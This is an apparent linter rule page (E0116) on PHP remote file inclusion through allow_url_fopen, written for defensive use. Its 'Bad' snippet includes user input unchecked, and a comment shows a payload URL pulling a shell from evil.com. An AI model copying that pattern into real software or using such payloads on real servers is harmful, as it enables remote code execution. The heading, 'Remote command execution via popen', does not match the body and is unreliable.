# E0116: Remote command execution via popen

**In plain English:** `allow_url_fopen = On` allows `file_get_contents()`, `include`, `fopen()` to open remote URLs. Combined with user input, this enables remote file inclusion (RFI).

**Why it matters:** RFI lets attackers include and execute remote PHP code on your server.

## Bad

```php
// php.ini: allow_url_fopen = On
$page = $_GET['page'] ?? '';
include $page; // ?page=http://evil.com/shell.txt
```

## Good

```php
// php.ini: allow_url_fopen = Off
$page = $_GET['page'] ?? '';
$allowed = ['home', 'about', 'contact'];
if (!in_array($page, $allowed, true)) {
    $page = 'home';
}
include "/pages/$page.php";
```

## What the rule checks

- `ini_set('allow_url_fopen', '1')` / `ini_set('allow_url_fopen', 'true')`
- Cannot read php.ini directly — only catches inline `ini_set()`

## When it does not report

- `allow_url_fopen` may be intentionally enabled for legitimate API calls
- Cannot detect php.ini/server-level configuration

## How to fix

1. Set `allow_url_fopen = Off` in php.ini
2. Use cURL or Guzzle with validation for remote HTTP requests
3. Never include/require files based on user input

## Configuration

E0116 is enabled by default and has no configuration options.

Remote file inclusion. Classic PHP vulnerability. Related to E0055/E0077.
